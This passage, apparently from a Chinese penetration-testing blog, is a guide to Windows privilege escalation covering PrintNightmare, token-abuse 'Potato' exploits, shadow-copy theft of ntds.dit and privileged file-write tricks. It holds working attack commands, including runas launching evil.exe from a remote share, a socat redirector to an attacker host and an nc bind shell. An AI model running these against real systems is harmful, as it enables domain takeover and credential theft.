Out-Null New-Item -Path ($RegStartPrinter + '\CopyFiles\Kiwi') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi') -Name 'Directory' -PropertyType 'String' -Value 'x64\3' | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi') -Name 'Files' -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi') -Name 'Module' -PropertyType 'String' -Value 'mscms.dll' | Out-Null New-Item -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String' -Value 'W32X86\3' | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files' -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module' -PropertyType 'String' -Value 'mscms.dll' | Out-Null New-Item -Path ($RegStartPrinter + '\CopyFiles\Mango') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango') -Name 'Directory' -PropertyType 'String' -Value $null | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango') -Name 'Files' -PropertyType 'MultiString' -Value $null | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango') -Name 'Module' -PropertyType 'String' -Value 'mimispool.dll' | Out-Null Execute the driver $serverName = 'dc.purple.lab' $printerName = 'Universal Priv Printer' $fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'}) Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue Add-Printer -ConnectionName $fullprinterName PrinterNightmare 漏洞CVE编号：CVE-2021-1675。未经身份验证的远程攻击者可利用该漏洞以SYSTEM权限在域控制器上执行任意代码，从而获得整个域的控制权。建议受影响用户及时更新漏洞补丁进行防护，做好资产自查以及预防工作，以免遭受黑客攻击。 影响范围 Windows Server 2012 R2 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 (Server Core installation) Windows Server 2012 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for 32-bit Systems Service Pack 2 Windows RT 8.1 Windows 8.1 for x64-based systems Windows 8.1 for 32-bit systems Windows 7 for x64-based Systems Service Pack 1 Windows 7 for 32-bit Systems Service Pack 1 Windows Server 2016 (Server Core installation) Windows Server 2016 Windows 10 Version 1607 for x64-based Systems Windows 10 Version 1607 for 32-bit Systems Windows 10 for x64-based Systems Windows 10 for 32-bit Systems Windows Server, version 20H2 (Server Core Installation) Windows 10 Version 20H2 for ARM64-based Systems Windows 10 Version 20H2 for 32-bit Systems Windows 10 Version 20H2 for x64-based Systems Windows Server, version 2004 (Server Core installation) Windows 10 Version 2004 for x64-based Systems Windows 10 Version 2004 for ARM64-based Systems Windows 10 Version 2004 for 32-bit Systems Windows 10 Version 21H1 for 32-bit Systems Windows 10 Version 21H1 for ARM64-based Systems Windows 10 Version 21H1 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows Server 2019 (Server Core installation) Windows Server 2019 Windows 10 Version 1809 for ARM64-based Systems Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems cube0x0/CVE-2021-1675: C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527 [〖EXP〗Ladon打印机漏洞提权CVE-2021-1675复现 K8哥哥’s Blog](https://k8gege.org/p/CVE-2021-1675.html) Bring Your Own Vulnerability windows 允许低权限用户安装打印机驱动，因此我们可以自行安装带有漏洞的驱动程序，然后通过这些驱动程序的漏洞提权到 SYSTEM。 Concealed Position : https://github.com/jacob-baines/concealed_position ACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE 利用 exp： jacob-baines/concealed_position: Bring your own print driver privilege escalation tool 利用 RunAS 命令提权或降权 RunAS 命令使用场景： 权限不够读不到帐密或 HASH 的情况下，验证用户是否使用某个已保存的密码，使用该已保存的密码可实现提权 SYSTEM 权限降权到某个用户进行操作时，例如切换到特定的用户，读取对应的浏览器记录、或者获取特定用户的 shell 等。 枚举保存的密码： cmdkey /list Currently stored credentials: Target: Domain:interactive=WORKGROUP\Administrator Type: Domain Password User: WORKGROUP\Administrator 使用保存的凭证连接远程 SMB 或者直接运行命令： runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" runas /savecred /user:Administrator "cmd.exe /k whoami" 其他利用： 〖教程〗Ladon非交互式runas执行命令/反弹SHELL 系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。 利用 Shadow Copies 提权（域控） 该利用方式一般用于从域控中获取 ntds.dit 文件（活动目录中的所有数据都保存在该文件中）。 获取卷影位置： # List shadow copies using vssadmin (Needs Admnistrator Access) vssadmin list shadows # List shadow copies using diskshadow diskshadow list shadows all 创建软链接以便查看。 # Make a symlink to the shadow copy and access mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\ 或者创建一个卷影拷贝，然后复制出来 vssadmin create shadow /for=c: copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\ntds.dit 获取到 ntds 后，可以想办法获取其中的散列值。 Impacket 中的 Secretsdump msf 中的 Psexec_ntdsgrab 模块 msf 中 Meterpreter会话 + windows/gather/credentials/domain_hashdump 参考资料： 域控安全之域渗透 - 知乎 利用 PsExec 提权(Win2003 &amp; Win2008) PsExec 是 windows 内核套件 SysInternalSuite 中的一个工具，可以从 Administrator 提权到 SYSTEM 下载地址:Sysinternals Utilities - Sysinternals | Microsoft Learn PsExec -i -s cmd 参考 SecBooks/【公众号文章】bypass/实战遇见到的好用提权方法集合.md at main · SexyBeast233/SecBooks 利用 Windows 自带文件、脚本提权 Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/ 滥用 Token 提权 条件： 已经拿到非管理员权限的服务帐户 效果： 提权至 SYSTEM 背景知识 当用户登录时，系统会创建一个访问令牌。用户执行的每个进程都有该访问令牌的副本。令牌标识了用户、用户的组、用户的权限以及SID（安全标识符）。 当本地管理员登录时，系统会创建两个访问令牌：一个具有管理员权限，另一个具有普通权限。默认情况下，当该用户执行进程时，将使用具有常规（非管理员）权限的进程。当此用户尝试以管理员身份执行任何操作（例如“以管理员身份运行”）时，将使用 UAC 来请求权限。 使用 whoami /priv 可以查看当前用户的权限。拥有下面权限时可考虑使用这种方式： iis sqlserver 的用户通常具有 SeImpersonatePrivilege 和 SeAssignPrimaryPrivilege 权限。 服务用户通常拥有 SeBackupPrivilege 和 SeRestorePrivilege 权限。 SeIncreaseQuotaPrivilege: DISABLED SeShutdownPrivilege: DISABLED SeAuditPrivilege: DISABLED SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED SeUndockPrivilege: DISABLED SeIncreaseWorkingSetPrivilege: DISABLED SeTimeZonePrivilege: DISABLED 不同的几种权限可能会用于不同的攻击场景 1. SeImpersonatePrivilege 任何拥有此权限的进程都可以模拟（但不能创建）它能够处理的任何令牌。 您可以从 Windows 服务 (DCOM) 获取特权令牌，使其针对该漏洞执行 NTLM 身份验证，然后以 SYSTEM 身份执行进程。 利用方法： 使用 NTLM relay 到本地协商获得系统用户的 token。 可以使用开源工具烂土豆、孤独土豆或多汁土豆。 通过WinAPI CreateProcessWithToken创建一个新的进程，传入系统用户的令牌。 只有具有SeImpersonatePrivilege权限才能成功创建。 2. SeAssignPrimaryPrivilege 它与 SeImpersonatePrivilege 非常相似，它将使用相同的方法来获取特权令牌。 然后，此权限允许将主令牌分配给新的/挂起的进程。 使用特权模拟令牌，您可以派生主令牌 (DuplicateTokenEx)。有了令牌，您可以使用“CreateProcessAsUser”创建一个新进程，或者创建一个挂起的进程并设置令牌（通常，您不能修改正在运行的进程的主令牌）。 利用方法： 利用 NTLM Relay 到当地谈判获得系统用户的 token 通过 WinAPI CreateProcessAsUser 创建新进程，传入系统用户的 token，该 token 具有系统权限。 3. SeBackupPrivilege 此权限使系统授予对任何文件的所有读取访问控制（仅限读取）。使用它从注册表中读取本地管理员帐户的密码哈希值，然后将“psexec”或“wmicexec”与哈希值 (PTH) 结合使用。 如果本地管理员被禁用，或者配置为本地管理员在远程连接时不是管理员，则此攻击将不起作用。 攻击场景：收集 4. SeRestorePrivilege 对系统上任何文件的写入访问控制，无论文件 ACL 为何。你可以修改服务、DLL劫持、设置调试器（图像文件执行选项）……很多选项可以升级 攻击场景：持久化；防御规避 5. SeCreateTokenPrivilege 仅当用户可以模拟令牌（即使没有 SeImpersonatePrivilege）时，此令牌才可以用作 EoP 方法。 在可能的情况下，如果令牌针对同一用户并且完整性级别小于或等于当前进程完整性级别，则用户可以模拟令牌。在这种情况下，用户可以创建一个模拟令牌并向其添加特权组 SID。 攻击方式：提权 6. SeLoadDriverPrivilege 加载和卸载设备驱动程序。 攻击方式：持久化；防御规避 7. SeTakeOwnershipPrivilege 此权限与 SeRestorePrivilege 非常相似。它允许进程通过授予 WRITE_OWNER 访问权限来“获得对象的所有权，而无需授予任意访问权限”。首先，您必须获得要写入的注册表项的所有权并修改 DACL，以便可以在其上写入。 攻击场景：持久化；防御规避；收集 8. SeDebugPrivilege 它允许持有者调试另一个进程，这包括读取和写入该进程的内存。有许多不同的内存注入策略可以与此特权一起使用，从而规避大多数 AV/HIPS 解决方案。 攻击方式：凭据窃取、提权、防御规避等。 9. SeTcbPrivilege 此权限将其持有者标识为受信任计算机库的一部分。某些受信任的受保护子系统被授予此特权。 攻击场景：权限提升 参考： Windows Token原理及利用 - 网安 渗透技巧——利用Windows的九大权限 - WEB and server security vulnerabilities - 黑客中文论坛网站 基于 Token 提权的利用工具就是常用的 Potato 家族了： Origin Potato(MS08-068) Origin Potato 就是 NTLM-Relay，微软在 kb957097 补丁中通过修复 SMB 身份验证答复的验证方式来防止凭据重播。 当主机 A 向主机 B 进行 SMB 认证的时候，将 pszTargetName 设置为 cifs/B，然后在 type2 拿到 B 发送的 Challenge 之后，在 lsass 里面缓存 (Challenge,cifs/B)，接着 B 拿到 A 的 type3，这时会去检查 lsass 缓存里是否有 (Challenge,cifs/B)，如果有就说明这是同一台主机，那么认证失败。 Hot Potato Hot Potato 是 Potato 家族最早的利用方式，其攻击原理如下： Windows Update 服务以 SYSTEM 权限运行，且会发起 NTLM 认证，如果能够作为中间人，我们就能够通过 NTLM Relay 获取到 SYSTEM 权限。 Windows Update 服务在运行时会默认请求 http://wpad/wpad.dat 这个 URL 以获取网络代理的配置，但这个域名并不是所有主机都会配置，公网上也没有这个域名，根据 Windows 的域名解析顺序（host-&gt; DNS 查询 -&gt; NBNS 查询），只要攻击者伪造一个 NBNS 查询的响应，就能够控制 Windows Update 服务的代理指向自己。 攻击者以中间人的身份完成 NTLM Relay 从而获取到 System 权限的 token。 影响范围： Windows 7,8,10,Server 2008 以及 Server 2012 其步骤如下： Windows Update 服务默认情况下会请求 http://wpad/wpad.dat 来获取网络代理配置。但不是所有的主机都存在保存着该域名解析的结果，当本地 HOST 及 DNS 查询都无法获取该域名的解析结果时，就会触发 NBNS 查询。 攻击者在本地发起 NBNS（NetBIOS 名称服务）欺骗。使得 Windows 在本地广播查询目标 HOST 时，攻击者伪造响应，声称 wpad 服务器 IP 地址为 127.0.0.1，并且返回网络代理配置为 127.0.0.1:80 Windows Update 服务获取到网络代理后，所有的 http 流量就都会经过攻击者搭建的 127.0.0.1:80。 此时 Windows Update 服务进行 NTLM 认证中的 Hash 就会被攻击者捕获，从而发起 NTLM Relay 攻击。 局限： 这种攻击手法需要等待 windows update 服务发起更新请求。 Rotten Potato 攻击原理： COM （组件对象模型）API 可以在指定的网络位置加载一个服务对象。以下面的代码为例，COM API 函数 CoGetInstanceFromIStorage 会根据指定的 IP 地址和端口号 127.0.0.1:6666 去获取指定的对象实例，该对象实例的 Guid 为 4991d34b-80a1-4291-83b6-3328366b9097，对应 BITS 实例。如果此时攻击者在 127.0.0.1:6666 端口正常回复，就可以强制让 COM 以 SYSTEM 权限对 6666 端口发起 net-NTLM 认证。（为什么选择 BITS 实例，是因为 BITS 实现了 IMarshal 接口并允许代理声明强制 NTLM 身份验证） public static void BootstrapComMarshal() { IStorage stg = ComUtils.CreateStorage(); // Use a known local system service COM server, in this cast BITSv1 Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097"); TestClass c = new TestClass(stg, String.Format("{0}[{1}]", "127.0.0.1", 6666)); // ip and port MULTI_QI[] qis = new MULTI_QI[1]; qis[0].pIID = ComUtils.IID_IUnknownPtr; qis[0].pItf = null; qis[0].hr = 0; CoGetInstanceFromIStorage(null, ref clsid, null, CLSCTX.CLSCTX_LOCAL_SERVER, c, 1, qis); } 如果我们能够完成这一次 NTLM 认证，就可以获取到 token，作者也使用了一个巧妙的方法，调用 AcceptSecurityContext 函数来处理 NLTM 认证 AcceptSecurityContext 是 Windows API 中用于安全上下文建立的函数之一，特别是在使用安全套接字（Secure Socket Layer，SSL）或者安全的远程过程调用（Remote Procedure Call，RPC）等场景下。它通常用于在服务端接受来自客户端的身份验证，并建立一个安全上下文（security context）以便进行后续的安全通信。这样一来，COM 充当客户端，AcceptSecurityContext 充当服务端，就能够完成 NTLM 认证。 尽管攻击者作为中间人将 AcceptSecurityContext 与 COM 之间建立起了 NTLM 认证，但两者之间的交互过程并不是简单的转发，主要有两个问题： 要正确响应 COM 服务，需要正确的 RPC 协议的数据包。作者将 COM 的请求发送到 135 端口的 rpcss 服务来获取一个响应模板。 两个次 NTLM Challenge 报文中的 NTLM Server Challenge 以及 Reserved 字段不同，需要进行修改。 上述的两个问题解决之后，就可以巧妙地获取到 SYSTEM token。有了 SYSTEM 权限的 token 之后，如果当前用户拥有 SelmpersonatePrivilege 或者 SeAssignPrimaryToken 权限，就可以通过该 Token 创建新进程达成提权。 步骤如下： 利用 CoGetInstanceFromIStorage API 强制 NT AUTHORITY/SYSTEM 运行的 RPC 服务向我们的本地代理(localhost:6666)发起 NTLM 身份验证。 CoGetInstanceFromIStorage API RPC 向代理发送 NTLM Negotiate 包。 代理将 NTLM Negotiate 包转发给端口 135 的 RPC 服务。于此同时，调用 AcceptSecurityContext 来强制进行本地身份验证。 RPC 135 和 AcceptSecurityContext 向代理发送 NTLM Challenge。两个数据包的内容被混合以匹配本地协商并转发到 RPC，其中 RPC 135 响应的报文充当 RPC 调用的模板。 RPC 使用 NLTM Auth 包进行响应，该包被代理服务器发送到 AcceptSecurityContext (8.) 并执行模拟 (9.)。 影响范围： &lt; win10 1809 和 windows server 2019 相关概念： 分布式组件对象模型(DCOM) COM 是 Windows 的一个组件，它促进了软件之间的互操作性，DCOM 通过远程过程调用(RPC)在网络上扩展了这一点。 后台智能传输服务(BITS) 可供程序员和系统管理员用于从 HTTP Web 服务器和 SMB 文件共享下载文件或将文件上传到其中。 Windows Update： BITS 服务用于下载和安装 Windows 更新。 Windows Defender 病毒定义更新： BITS 用于后台更新 Windows Defender 病毒定义。 应用程序和系统更新： 第三方应用程序和系统组件可以利用 BITS 进行后台更新。 CLSID是标识 COM 类对象的全局唯一标识符。它是一个类似UUID的标识符。 Juicy Potato Rotten Potato 的 PoC 使用了 COM 来激活 BITS 服务。Windows 在修补 Rotten Potato 时，禁用了 BITS 服务，并且占用了 6666 端口，但该修补并不能完全杜绝这类问题，作者找到了其他可以选择的 COM 对象，也可以发起 NTLM 请求。 其具体利用过程与 Rotten Potato 类似： Juicy Potato 通过传递 BITS 的 CLSID 和 IStorage 对象实例给 CoGetInstanceFromIStorage 函数，使得 rpcss 激活 BITS 服务。 随后 rpcss 的 DCOM OXID resolver 会解析序列化数据中的 OBJREF 拿到DUALSTRINGARRAY 字段，该字段指定了 host[port] 格式的 location，绑定对象时会向其中的 host[port] 发送 DEC/RPC 请求，这时，如果攻击者控制了这个端口，就可以要求进行 NTLM 身份验证，那么高权限服务就会发送 net-NTLM 进行认证。 其后的过程与 Rotten Potato 一致 影响范围： &lt; Windows 10 1809 &lt; Windows Server 2019 Pipe Potato（PrintSpoofer） 命名管道提权原理： windows 中有一个 API ImpersonateNamedPipeClient()，允许服务端进程对连接到它的客户端进程进行模拟。通过调用 ImpersonateNamedPipeClient()，命名管道服务端可以模拟命名管道客户端的安全上下文，从而直接将命名管道服务端当前线程的 Token 令牌更改为命名管道客户端的 Token令牌。 因此命名管道提权的原理大多类似，一般是诱使 system 权限的服务访问我们创建的命名管道。 PrintSpoofer 原理： Windows 的 MS-RPRN 协议用于打印客户机和打印服务器之间的通信，默认情况下启用。同时，Print Spooler 服务的 RPC 接口暴露在命名管道：\.\pipe\spoolss 中，该服务默认开启。 MS-RPRN 协议定义的 RpcRemoteFindFirstPrinterChangeNotificationEx() 函数创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端，并且就是通过命名管道实现进程之间的通信。 DWORD RpcRemoteFindFirstPrinterChangeNotificationEx( /* [in] */ PRINTER_HANDLE hPrinter, /* [in] */ DWORD fdwFlags, /* [in] */ DWORD fdwOptions, /* [unique][string][in] */ wchar_t *pszLocalMachine, /* [in] */ DWORD dwPrinterLocal, /* [unique][in] */ RPC_V2_NOTIFY_OPTIONS *pOptions) 其中 pszLocalMachine 是指向表示客户端计算机名称的字符串的指针，需要传递一个 UNC 路径，传递 \127.0.0.1 时，服务器会访问 \127.0.0.1\pipe\spoolss，但这个管道已经被系统注册了，并由 NT AUTHORITY\SYSTEM 控制。如果我们传入是 \127.0.0.1\pipe\demo， spoolsv.exe 进程也会对Server name做了校验，最后还是会替换成 \192.168.110.137\pipe\spools 管道。 作者在这里利用了 windows UNC 路径规范化的技巧绕过了这个限制 考虑到 UNC 路径的性质，如果主机名包含 /，它将通过路径检查，但真正连接的时候会转化为 \ 。那么，如果传递一个 \127.0.0.1/pipe/foo，检查时会认为 127.0.0.1/pipe/foo 是一个主机名，随后在连接 named pipe 时会对参数做标准化，于是就会连接 \127.0.0.1\pipe\foo\pipe\spoolss，那么攻击者就可以把主机名改为 \127.0.0.1/pipe/foo 并注册这个 named pipe 从而窃取 client 的 token。 利用工具： itm4n/PrintSpoofer: Abusing impersonation privileges through the “Printer Bug” 参考： Windows 命名管道客户端模拟和 PrintSpoofer 原理探究 Bad Potato BadPotato是C#版本的PrintSpooler，结构代码也更加简化，并且恶意管道服务端用的是对方机器的名字，而PrintSpooler用的是随机生成的UUID，pipePotato则是固定的”xxx”（导致可用性也更低） 利用工具： BeichenDream/BadPotato: Windows 权限提升 BadPotato Rogue Potato 为了修补 Juicy Potato，高版本的 Windows DCOM 解析器不允许 OBJREF 中的 DUALSTRINGARRAY 字段指定端口号。 利用条件： 我们需要有一台机器在我们的控制之下，我们可以在其中执行重定向，并且受害者必须可以在端口 135上访问该机器 我们需要上传两个 exe 文件，当受害者的防火墙不接受传入连接时，也可以在我们控制的 Windows 机器上以独立模式启动伪造的 OXID 解析器 利用思路： Rogue Potato 的利用思路是在远程服务器的 135 端口上做一个转发，用于将 OXID 解析请求重定向到一个假的OXID RPC 服务器。 伪造的OXID RPC 服务器实现了ResolveOxid2服务器过程，该过程将指向受控命名管道[ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper] DCOM 服务器将连接到 RPC 服务器以执行 IRemUnkown2 接口调用。通过连接到命名管道，将执行”身份验证回调”，我们可以通过 RpcImpersonateClient()调用模拟调用者。 然后,令牌窃取者 1.获取rpcss服务的PID 2.打开进程，列出所有句柄，并为每个句柄尝试复制它并获取句柄类型 3.如果句柄类型为”Token”且令牌所有者为 SYSTEM，则尝试使用CreatProcessAsUser()或CreateProcessWithToken()模拟并启动进程 影响范围： &gt;= Windows 10 1809 &amp; Windows Server 2019 利用工具： https://github.com/antonioCoco/RoguePotato # Network redirector / port forwarder to run on your remote machine, must use port 135 as src port socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999 # RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. # Use this if you have fw restrictions. RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" # RoguePotato all in one with RogueOxidResolver running locally on port 9999 RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 #RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode EfsPotato（PetitPotam） 利用EFSRPC（加密文件系统远程协议），进行NTLM中继攻击可实现AD域内权限提升或本地权限提升。 影响范围： Windows Server, version 20H2 (Server Core Installation) Windows Server, version 2004 (Server Core installation) Windows Server 2019 (Server Core installation) Windows Server 2019 Windows Server 2016 (Server Core installation) Windows Server 2016 Windows Server 2012 R2 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 (Server Core installation) Windows Server 2012 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for 32-bit Systems Service Pack 2 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2008 R2 for x64-based Systems Service Pack 1 利用工具： zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability). bugch3ck/SharpEfsPotato: Local privilege escalation from SeImpersonatePrivilege using EfsRpc. Ghost potato（MS08-068 绕过） 为防止用户 relay 本机，在 lsass 中添加缓存绕过，如果缓存中有 (Challenge,cifs/B) 就会认证失败。 然而这个 (Challenge,cifs/B) 是有时效性的（300s），所有只要等 300s 再发送 type3 就可以 bypass 了。 用修改后的 impacket https://shenaniganslabs.io/files/impacket-ghostpotato.zip 可以直接打，用法和MS08-068 类似。 Sweet Potato 集成了前面几种土豆触发 NTLM 认证的方式，包括：COM，WinRM，Spoolsv，其中 WInRM 的攻击原理参考：https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/ 大致思路就是当 WinRM 在当前系统未启用时，攻击者监听本机 5985 端口，BITS 服务会向 WinRM 5985 发起 NTLM 认证。 RottenPotato Weaponized JuciyPotato with BITS WinRM discovery PrintSpoofer discovery and original exploit EfsRpc built on EfsPotato PetitPotam 利用工具：CCob/SweetPotato: Local Service to SYSTEM privilege escalation from Windows 7 to Windows 10 / Server 2019 Generic Potato SweetPotato 的修改版本， 是@micahvandeusen 用于支持通过 HTTP 和/或命名管道模拟身份验证。 这允许从 SSRF 和/或文件写入进行本地权限升级。 在以下情况下它很方便： 我们有权访问的用户拥有 SeImpersonatePrivilege 系统没有运行打印服务，这会阻止 SweetPotato 。 WinRM 正在运行以防止 RogueWinRM 您不允许对您控制的任何计算机进行出站 RPC，并且禁用 BITS 服务以防止 RoguePotato 。 利用工具： micahvandeusen/GenericPotato: Impersonating authentication over HTTP and/or named pipes. JuicyPotatoNG Giving JuicyPotato a second chance: JuicyPotatoNG – Decoder’s Blog 利用工具： antonioCoco/JuicyPotatoNG: Another Windows Local Privilege Escalation from Service Account to System GodPotato 影响范围： Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11 利用工具： BeichenDream/GodPotato 靶场 Juicy Potato - HackTheBox-Jeeves Rogue Potato - HackTheBox-Remote 参考： Potatoes - Windows Privilege Escalation · Jorge Lajara Website Potato 家族提权分析 - Geekby’s Blog 【精选】Rotten/Juicy Potato提权工原理分析_rottenpotato-CSDN博客 Potato 家族提权学习 NTLM-relay攻击的原理与实现 Windows 命名管道客户端模拟和 PrintSpoofer 原理探究 通过特权文件写入提权 DiagHub 从版本 1903 及更高版本开始，DiagHub 不能再用于加载任意 DLL。 Microsoft 诊断中心标准收集器服务 (DiagHub) 是一项收集跟踪信息并通过 DCOM 以编程方式公开的服务。 该 DCOM 对象可用于将 DLL 加载到 SYSTEM 进程中，前提是该 DLL 存在于 C:\Windows\System32 目录中。 利用步骤： 创建一个邪恶的 DLL 例如：payload.dll 并将其移至 C:\Windows\System32 build https://github.com/xct/diaghub diaghub.exe c:\ProgramData\ Payload.dll 默认有效负载将运行 C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe UsoDLLLoader 2020-06-06 更新：此技巧不再适用于最新版本的 Windows 10 Insider Preview。 如果我们在 Windows 或某些第三方软件中发现特权文件写入漏洞，我们可以将自己版本的 windowscoredeviceinfo.dll 复制到 C:\Windows\Sytem32\中，然后让 USO 服务以 NT AUTHORITY\System 的身份加载它。 利用步骤： 构建 https://github.com/itm4n/UsoDllLoader 选择发布配置和 x64 架构。 构建解决方案。 DLL .\x64\Release\WindowsCoreDeviceInfo.dll 加载程序.\x64\Release\UsoDllLoader.exe。 将 WindowsCoreDeviceInfo.dll 复制到 C:\Windows\System32\ 使用加载程序并等待 shell 或运行 usoclient StartInteractiveScan 并连接到端口 1337 上的绑定 shell。 WerTrigger 利用 Windows 问题报告写入特权。 利用步骤： 克隆 https://github.com/sailay1996/WerTrigger 将 phoneinfo.dll 复制到C:\Windows\System32\ 将 Report.wer 文件和 WerTrigger.exe 放在同一目录中。 然后，运行 WerTrigger.exe。 享受 NT AUTHORITY\SYSTEM 的 shell WerMgr 利用 Windows 错误报告的特权目录创建错误达成提权 利用步骤： Clone https://github.com/binderlabs/DirCreate2System Create directory C:\Windows\System32\wermgr.exe.local\ Grant access to it: cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f Place spawn.dll file and dircreate2system.exe in a same directory and run .\dircreate2system.exe. Enjoy a shell as NT AUTHORITY\SYSTEM 通过特权文件删除提权 在 MSI 安装期间，Windows Installer 服务会维护每个更改的记录，以防需要回滚，为此它将创建： C:\Config.Msi 中的文件夹包含 回滚脚本 (.rbs) 回滚文件 (.rbf) 要将特权文件删除转换为本地权限提升，您需要滥用 Windows Installer 服务。 Windows Installer 创建受保护的 C:\Config.Msi 文件夹后立即将其删除 重新创建具有弱 DACL 权限的 C:\Config.Msi 文件夹，因为普通用户可以在 C:\ 根目录下创建文件夹。 将恶意 .rbs 和 .rbf 文件放入其中，以便由 MSI 回滚执行 然后在回滚时，Windows Installer 将对系统进行任意更改 触发此链的最简单方法是使用 zdi/FilesystemEoPs/FolderOrFileDeleteToSystem。 该漏洞利用包含一个具有 2 个操作的 .msi 文件，第一个操作会产生延迟，第二个操作会引发错误以使其回滚。 此回滚将“恢复”C:\Program Files\Common Files\microsoft shared\ink\HID.dll 中的恶意 HID.dll。 然后使用 [CTRL]+[ALT]+[DELETE] 切换到安全桌面并打开屏幕键盘 (osk.exe)。 osk.exe进程首先查找C:\Program Files\Common Files\microsoft共享\ink\HID.dll库而不是C:\Windows\System32\HID.dll Windows 域内提权 WSUS WSUS 是微软推出的免费的 Windows 更新管理服务，当我们获得了WSUS服务器的控制权限后，可以通过推送补丁的方式进行横向移动。这个利用方法最早公开在BlackHat USA 2015。 利用工具 https://github.com/nettitude/SharpWSUS https://github.com/AlsidOfficial/WSUSpendu https://github.com/ThunderGunExpress/Thunder_Woosus 以上三个工具的实现原理基本相同，都是创建一个调用psexec执行命令的补丁，将补丁推送至指定计算机，等待目标计算机更新补丁 嘶货 KrbRelayUp CVE-2022–26923 域内提权漏洞。 这本质上是在不强制执行 LDAP 签名（默认设置）的 Windows 域环境中的通用无修复本地权限升级。 这意味着每台域内 Windows 主机都只要未更改默认设置并强制执行 LDAP 签名设置，就容易受到攻击。最酷的是，不需要拥有特殊权限或成为管理员。 [No-Fix Local Privilege Escalation Using KrbRelay With Shadow Credentials Icyguider’s Blog](https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html) [From unprivileged user to system - KrbRelayUp wwwGeneral](https://wwwgeneral.github.io/posts/from-unprivileged-user-to-system-krbrelayup/) 参考资料 PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings 手把手教你Windows提权 - FreeBuf网络安全行业门户 windows-security/Readme_full.md at master · alphaSeclab/windows-security]]></summary></entry><entry><title type="html">Windows 提权（三）利用服务权限错误提权</title><link href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-3-%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83.html" rel="alternate" type="text/html" title="Windows 提权（三）利用服务权限错误提权" /><published>2023-11-20T13:34:21+08:00</published><updated>2023-11-20T13:34:21+08:00</updated><id>/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-3-%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83</id><content type="html" 